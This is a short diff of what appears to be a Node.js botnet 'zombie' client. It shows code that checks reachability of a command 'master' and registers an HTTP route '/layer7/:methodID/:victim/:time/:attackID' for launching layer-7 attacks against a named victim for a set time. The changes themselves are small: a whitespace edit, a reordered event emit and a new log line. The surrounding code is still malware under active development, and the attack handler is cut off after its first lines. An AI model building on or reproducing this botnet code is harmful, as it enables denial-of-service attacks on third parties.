@@ -81,7 +81,7 @@ function checkLocalMaster() {
 
 checkLocalMaster()
 
-function checkMaster(master_) {
+function    checkMaster(master_) {
     axios.get("http://" + master_)
         .then(res => {
             let code = res.statusCode
@@ -89,8 +89,8 @@ function checkMaster(master_) {
             let body = res.data
             if ((body === "OKAY" || (code === 200) && (statusMessage === "OK"))) {
                 console.log("Master reached.", master_);
-                masterReachable.emit('true', master_);
                 master = master_
+                masterReachable.emit('true', master_);
             } else {
                 db.delete('master.ip')
                 db.delete('master')
@@ -128,6 +128,7 @@ masterReachable.on('true', (s) => {
 });
 
 settingIntegrity.on('true', () => {
+    console.log("SETTING INTEGRITY OK!");
     app.get('/layer7/:methodID/:victim/:time/:attackID', (req, res) => {
         if (zombie.busy === false) {
             let victim = req.params.victim
